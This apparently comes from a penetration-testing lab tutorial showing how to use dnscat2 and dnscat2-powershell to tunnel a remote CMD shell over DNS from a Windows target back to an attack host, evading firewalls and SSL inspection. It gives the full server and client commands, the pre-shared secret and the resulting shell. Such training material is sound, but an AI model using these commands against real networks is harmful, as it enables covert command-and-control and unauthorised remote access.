# DNS Tunneling with Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) tunnels arbitrary data through DNS queries and responses, turning a protocol almost universally allowed through firewalls into a covert C2 channel. Because DNS traffic is rarely inspected as deeply as HTTP or HTTPS, and because most firewalls must allow DNS outbound for normal operations to function, dnscat2 can establish persistent encrypted sessions in environments where every other outbound port is locked down or monitored.

## Why DNS Makes an Effective Tunnel

Active Directory environments rely on internal DNS servers to resolve hostnames to IPs. When a client makes a DNS query for a domain you control, that query eventually reaches your authoritative DNS server. Dnscat2 exploits this by encoding data inside DNS query names and TXT record responses, so what looks like legitimate DNS resolution traffic is actually carrying command output, file transfers, or shell sessions. Unlike HTTPS-based C2 channels that can be intercepted by SSL inspection proxies, DNS tunneling bypasses those controls entirely because most proxy appliances do not perform deep content inspection on DNS.

## Server Setup on the Attack Host

The server component is written in Ruby and runs on the attack host acting as the authoritative resolver for the domain specified:

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Start the server, binding it to the attack host's IP and specifying the domain to act as authoritative for:

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

On startup the server generates a pre-shared secret:

```
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```

This secret is used to authenticate and encrypt the session. Any client connecting without the matching secret will be rejected. The `--no-cache` flag prevents dnscat2 from caching responses, which matters in testing environments where DNS responses may be served from cache rather than reaching the server.

## Client Setup on the Windows Target

The PowerShell-based client [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) is the most practical option for Windows targets since it requires no compiled binaries -- just a `.ps1` file that can be transferred via any available method.

Clone it on the attack host and transfer `dnscat2.ps1` to the Windows target:

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

On the Windows target, import the module and start the tunnel:

```powershell
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

The `-Exec cmd` flag tells the client to spawn a CMD shell and pipe it through the tunnel. The server confirms the session:

```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
```

## Working with Sessions

Once a session is active the dnscat2 console provides a basic window management interface. Typing `?` lists all available commands:

```
* tunnels
* windows
* window
* kill
* start / stop
```

To drop into an interactive shell session from the server side, switch to the established window:

```bash
dnscat2> window -i 1
```

This gives a full interactive CMD prompt on the Windows target:

```
Microsoft Windows [Version 10.0.18363.1801]
C:\Windows\system32>
```

The session label `exec (OFFICEMANAGER) 1` indicates the process name and session number, which helps track multiple concurrent sessions across different targets.
